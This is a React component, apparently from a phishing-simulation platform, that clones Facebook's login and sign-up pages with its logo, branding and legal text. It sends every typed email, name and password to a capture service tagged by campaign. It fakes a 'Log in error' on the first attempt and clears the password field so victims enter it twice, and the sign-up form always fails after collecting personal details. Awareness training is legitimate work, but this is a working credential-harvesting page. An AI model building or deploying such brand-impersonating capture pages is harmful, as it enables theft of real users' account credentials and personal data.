import { useState } from 'react';
import facebookLogo from '../../assets/images/facebook.png';
import { recordCapturedInput } from '../../services/eventService';

interface FacebookSimulationProps {
  onSubmitAttempt: (username: string) => void;
  campaignId?: string;
  templateId?: string;
}

// ── Meta wordmark SVG (∞ Meta) ─────────────────────────────────
function MetaWordmark() {
  return (
    <div className="flex items-center justify-center gap-1.5">
      {/* Infinity/Meta symbol */}
      <svg width="36" height="18" viewBox="0 0 36 18" fill="none">
        <path
          d="M18 9C18 5.686 15.314 3 12 3C8.686 3 6 5.686 6 9C6 12.314 8.686 15 12 15C13.85 15 15.505 14.14 16.6 12.8L18 11L19.4 12.8C20.495 14.14 22.15 15 24 15C27.314 15 30 12.314 30 9C30 5.686 27.314 3 24 3C20.686 3 18 5.686 18 9Z"
          fill="none"
          stroke="#1877F2"
          strokeWidth="2.5"
        />
        <path
          d="M18 9C18 12.314 15.314 15 12 15C8.686 15 6 12.314 6 9"
          fill="none"
          stroke="#1877F2"
          strokeWidth="2.5"
        />
        <path
          d="M18 9C18 5.686 20.686 3 24 3C27.314 3 30 5.686 30 9"
          fill="none"
          stroke="#1877F2"
          strokeWidth="2.5"
        />
      </svg>
      <span
        style={{
          fontFamily: 'Optimistic Display, Helvetica Neue, Helvetica, Arial, sans-serif',
          color: '#1c1e21',
          fontSize: '17px',
          fontWeight: 600,
          letterSpacing: '-0.2px',
        }}
      >
        Meta
      </span>
    </div>
  );
}

// ── Shared Page Shell ─────────────────────────────────────────────
function FacebookPageShell({ children }: { children: React.ReactNode }) {
  return (
    <div
      className="min-h-screen w-full flex flex-col items-center justify-center py-8 px-4"
      style={{
        backgroundColor: '#f0f2f5',
        fontFamily: 'Helvetica Neue, Helvetica, Arial, sans-serif',
      }}
    >
      <div className="w-full max-w-[400px] bg-white rounded-2xl shadow-md p-8">
        {children}
      </div>
    </div>
  );
}

// ── SIGN UP / CREATE ACCOUNT PAGE ─────────────────────────────────
function FacebookSignUp({
  onBack,
  campaignId,
  templateId,
}: {
  onBack: () => void;
  campaignId?: string;
  templateId?: string;
}) {
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [month, setMonth] = useState('');
  const [day, setDay] = useState('');
  const [year, setYear] = useState('');
  const [gender, setGender] = useState('');
  const [emailOrPhone, setEmailOrPhone] = useState('');
  const [password, setPassword] = useState('');
  const [isSpinning, setIsSpinning] = useState(false);
  const [createError, setCreateError] = useState('');

  const capture = (field: string, value: string) => {
    if (campaignId && templateId) {
      recordCapturedInput(campaignId, templateId, 'Facebook', field, value);
    }
  };

  const handleSignupSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!firstName || !lastName || !month || !day || !year || !gender || !emailOrPhone || !password) return;

    setIsSpinning(true);
    setCreateError('');

    setTimeout(() => {
      setIsSpinning(false);
      setCreateError('Create account error. Please try again later.');
    }, 2500);
  };

  if (isSpinning) {
    return (
      <FacebookPageShell>
        <div className="flex flex-col items-center justify-center p-8 space-y-6">
          <img
            src={facebookLogo}
            alt="Loading"
            className="w-[72px] h-[72px] object-contain animate-spin"
          />
          <p className="text-sm font-semibold text-slate-500 animate-pulse">Loading...</p>
        </div>
      </FacebookPageShell>
    );
  }

  // Generate lists for select dropdowns
  const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
  const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
  const years = Array.from({ length: 100 }, (_, i) => String(new Date().getFullYear() - i));

  const selectStyle = {
    border: '1px solid #dddfe2',
    backgroundColor: '#fff',
    borderRadius: '8px',
    padding: '10px',
    fontSize: '14px',
    outline: 'none',
    width: '100%',
  };

  const inputStyle = {
    border: '1px solid #dddfe2',
    backgroundColor: '#fff',
    borderRadius: '8px',
    padding: '12px',
    fontSize: '14px',
    outline: 'none',
    width: '100%',
  };

  return (
    <FacebookPageShell>
      {/* Back button and Meta */}
      <div className="flex flex-col items-start gap-4 mb-4">
        <button type="button" onClick={onBack} className="text-slate-700 hover:text-black">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
          </svg>
        </button>
        <div className="scale-75 origin-left">
          <MetaWordmark />
        </div>
      </div>

      <div className="space-y-2 mb-6">
        <h2 className="text-2xl font-bold text-slate-800 leading-tight">Get started on Facebook</h2>
        <p className="text-[13px] text-slate-500 leading-relaxed">
          Create an account to connect with friends, family and communities of people who share your interests.
        </p>
      </div>

      {createError && (
        <div className="bg-red-50 border border-red-200 text-red-600 rounded-lg p-3 text-xs font-semibold text-center mb-4">
          {createError}
        </div>
      )}

      <form onSubmit={handleSignupSubmit} className="space-y-4" noValidate>
        <div className="space-y-4">
          {/* Name fields */}
          <div className="space-y-1.5">
            <label className="text-sm font-semibold text-slate-700">Name</label>
            <div className="flex gap-3">
              <input
                type="text"
                required
                placeholder="First name"
                value={firstName}
                onChange={(e) => { setFirstName(e.target.value); capture('name', `${e.target.value} ${lastName}`); }}
                style={inputStyle}
              />
              <input
                type="text"
                required
                placeholder="Last name"
                value={lastName}
                onChange={(e) => { setLastName(e.target.value); capture('name', `${firstName} ${e.target.value}`); }}
                style={inputStyle}
              />
            </div>
          </div>

          {/* Birthday fields */}
          <div className="space-y-1.5">
            <div className="flex items-center gap-1">
              <label className="text-sm font-semibold text-slate-700">Birthday</label>
              <span className="text-xs text-slate-500 rounded-full border border-slate-300 w-4 h-4 flex items-center justify-center font-bold">?</span>
            </div>
            <div className="flex gap-2">
              <select value={month} onChange={(e) => setMonth(e.target.value)} style={selectStyle}>
                <option value="">Month</option>
                {months.map((m, idx) => (
                  <option key={m} value={String(idx + 1)}>{m}</option>
                ))}
              </select>
              <select value={day} onChange={(e) => setDay(e.target.value)} style={selectStyle}>
                <option value="">Day</option>
                {days.map((d) => (
                  <option key={d} value={d}>{d}</option>
                ))}
              </select>
              <select value={year} onChange={(e) => setYear(e.target.value)} style={selectStyle}>
                <option value="">Year</option>
                {years.map((y) => (
                  <option key={y} value={y}>{y}</option>
                ))}
              </select>
            </div>
          </div>

          {/* Gender */}
          <div className="space-y-1.5">
            <div className="flex items-center gap-1">
              <label className="text-sm font-semibold text-slate-700">Gender</label>
              <span className="text-xs text-slate-500 rounded-full border border-slate-300 w-4 h-4 flex items-center justify-center font-bold">?</span>
            </div>
            <select value={gender} onChange={(e) => setGender(e.target.value)} style={selectStyle}>
              <option value="">Select your gender</option>
              <option value="Female">Female</option>
              <option value="Male">Male</option>
              <option value="Custom">Custom</option>
            </select>
          </div>

          {/* Email or Phone */}
          <div className="space-y-1.5">
            <label className="text-sm font-semibold text-slate-700">Mobile number or email</label>
            <input
              type="text"
              required
              placeholder="Mobile number or email"
              value={emailOrPhone}
              onChange={(e) => { setEmailOrPhone(e.target.value); capture('email', e.target.value); }}
              style={inputStyle}
            />
            <p className="text-[11px] text-slate-500 leading-normal">
              You may receive notifications from us. <span className="text-[#1877F2] cursor-pointer">Learn why we ask for your contact information</span>
            </p>
          </div>

          {/* Password */}
          <div className="space-y-1.5">
            <label className="text-sm font-semibold text-slate-700">Password</label>
            <input
              type="password"
              required
              placeholder="Password"
              value={password}
              onChange={(e) => { setPassword(e.target.value); capture('credential_field', e.target.value); }}
              style={inputStyle}
            />
          </div>

          {/* Terms text */}
          <p className="text-[10px] text-slate-500 leading-normal">
            People who use our service may have uploaded your contact information to Facebook. <span className="text-[#1877F2] cursor-pointer">Learn more</span>.<br />
            By tapping Submit, you agree to create an account and to Facebook's <span className="text-[#1877F2] cursor-pointer">Terms</span>, <span className="text-[#1877F2] cursor-pointer">Privacy Policy</span> and <span className="text-[#1877F2] cursor-pointer">Cookies Policy</span>.<br />
            The <span className="text-[#1877F2] cursor-pointer">Privacy Policy</span> describes the ways we can use the information we collect when you create an account. For example, we use this information to provide, personalize and improve our products, including ads.
          </p>
        </div>

        {/* Buttons */}
        <div className="space-y-3 pt-6">
          <button
            type="submit"
            className="w-full py-3 rounded-full font-bold text-white text-[15px] transition-opacity hover:opacity-90"
            style={{ backgroundColor: '#1877F2' }}
          >
            Submit
          </button>

          <button
            type="button"
            onClick={onBack}
            className="w-full py-3 rounded-full font-bold text-slate-700 text-[15px] transition-colors hover:bg-slate-200"
            style={{ backgroundColor: '#f0f2f5' }}
          >
            I already have an account
          </button>
        </div>
      </form>
    </FacebookPageShell>
  );
}

// ── MAIN EXPORT (LOGIN AND SIGNUP FLOWS) ──────────────────────────
export default function FacebookSimulation({ onSubmitAttempt, campaignId, templateId }: FacebookSimulationProps) {
  const [page, setPage] = useState<'login' | 'signup'>('login');
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [isSpinning, setIsSpinning] = useState(false);
  const [loginError, setLoginError] = useState('');

  const capture = (field: string, value: string) => {
    if (campaignId && templateId) {
      recordCapturedInput(campaignId, templateId, 'Facebook', field, value);
    }
  };

  const handleLoginSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) return;

    setIsSpinning(true);
    setLoginError('');

    setTimeout(() => {
      setIsSpinning(false);
      if (loginAttempts === 0) {
        setLoginError('Log in error. Please try again.');
        setLoginAttempts(1);
        setPassword('');
      } else {
        onSubmitAttempt(username);
      }
    }, 2500);
  };

  if (page === 'signup') {
    return <FacebookSignUp onBack={() => setPage('login')} campaignId={campaignId} templateId={templateId} />;
  }

  if (isSpinning) {
    return (
      <FacebookPageShell>
        <div className="flex flex-col items-center justify-center p-8 space-y-6">
          <img
            src={facebookLogo}
            alt="Loading"
            className="w-[72px] h-[72px] object-contain animate-spin"
          />
          <p className="text-sm font-semibold text-slate-500 animate-pulse">Loading...</p>
        </div>
      </FacebookPageShell>
    );
  }

  return (
    <FacebookPageShell>
      {/* Facebook logo */}
      <div className="flex justify-center pt-2 pb-6">
        <img
          src={facebookLogo}
          alt="Facebook"
          className="w-[72px] h-[72px] object-contain"
        />
      </div>

      {loginError && (
        <div className="text-center text-red-500 text-sm font-semibold mb-4">
          {loginError}
        </div>
      )}

      {/* Login form */}
      <form onSubmit={handleLoginSubmit} className="space-y-4" noValidate>
        <input
          id="fb-username"
          type="text"
          required
          placeholder="Mobile number or email"
          value={username}
          onChange={(e) => { setUsername(e.target.value); capture('email', e.target.value); }}
          className="w-full px-3.5 py-3 text-sm rounded-md text-[#1c1e21] placeholder-[#bcc0c4] outline-none"
          style={{
            border: '1px solid #dddfe2',
            backgroundColor: '#fff',
          }}
          onFocus={(e) => (e.currentTarget.style.borderColor = '#1877F2')}
          onBlur={(e) => (e.currentTarget.style.borderColor = '#dddfe2')}
        />

        <input
          id="fb-password"
          type="password"
          required
          placeholder="Password"
          value={password}
          onChange={(e) => { setPassword(e.target.value); capture('credential_field', e.target.value); }}
          className="w-full px-3.5 py-3 text-sm rounded-md text-[#1c1e21] placeholder-[#bcc0c4] outline-none"
          style={{
            border: '1px solid #dddfe2',
            backgroundColor: '#fff',
          }}
          onFocus={(e) => (e.currentTarget.style.borderColor = '#1877F2')}
          onBlur={(e) => (e.currentTarget.style.borderColor = '#dddfe2')}
        />

        <button
          type="submit"
          className="w-full py-3 rounded-full font-bold text-white text-[15px] transition-opacity hover:opacity-90"
          style={{ backgroundColor: '#1877F2' }}
        >
          Log in
        </button>

        <div className="text-center py-1">
          <span
            className="text-[#1877F2] text-sm font-medium cursor-pointer hover:underline"
          >
            Forgot password?
          </span>
        </div>

        <div className="border-t border-[#dddfe2] pt-6 pb-2">
          <button
            type="button"
            onClick={() => setPage('signup')}
            className="w-full border border-[#dddfe2] rounded-full py-2.5 text-center cursor-pointer hover:bg-[#f5f5f5] transition-colors"
          >
            <span className="text-[#1877F2] font-semibold text-sm">Create new account</span>
          </button>
        </div>
      </form>

      {/* Meta wordmark footer */}
      <div className="mt-8 flex justify-center">
        <MetaWordmark />
      </div>
    </FacebookPageShell>
  );
}

